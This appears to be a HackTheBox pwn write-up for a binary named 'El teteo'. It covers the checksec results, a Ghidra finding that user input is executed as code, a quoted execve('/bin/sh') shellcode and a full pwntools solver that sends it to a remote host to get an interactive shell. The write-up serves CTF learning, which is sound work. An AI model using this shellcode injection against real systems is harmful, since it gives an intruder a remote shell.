---
title: El teteo
tags:
  - CTF
  - HackTheBox
  - Pwn
---
First, I checked the security of the binary with `checksec`:

![](Pasted%20image%2020241023161716.png)

So it has the following protections:

| Protection | Enabled  |                     Usage                     |
| :--------: | :------: | :-------------------------------------------: |
| **Canary** |    ✅     |         Prevents **Buffer Overflows**         |
|   **NX**   |    ❌     |     Disables **code execution** on stack      |
|  **PIE**   |    ✅     | Randomizes the **base address** of the binary |
| **ReLRO**  | **Full** |   Makes some binary sections **read-only**    |

Then I executed the binary:

![](Pasted%20image%2020241023161557.png)

I analyzed the code with Ghidra:

![](Pasted%20image%2020241023161912.png)

Our input is being stored in local_68 and called as a function, so we can use the following payload from [shellstorm.org](https://shell-storm.org/shellcode/files/shellcode-806.html):

`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05`

And our solver script will look like:

```shell
#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './el_teteo' 

LOCAL = False # CHANGE THIS TO True if you want to run it locally

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

# Shellcode from https://shell-storm.org/shellcode/files/shellcode-806.html
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# Send shellcode
r.sendlineafter('>', sc)

# Get flag
pause(1)

# Interact with the shell
r.interactive()

# Don't know why, but the following doesn't work
#r.sendline('cat flag*')
#print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
```

![](Pasted%20image%2020241023232307.png)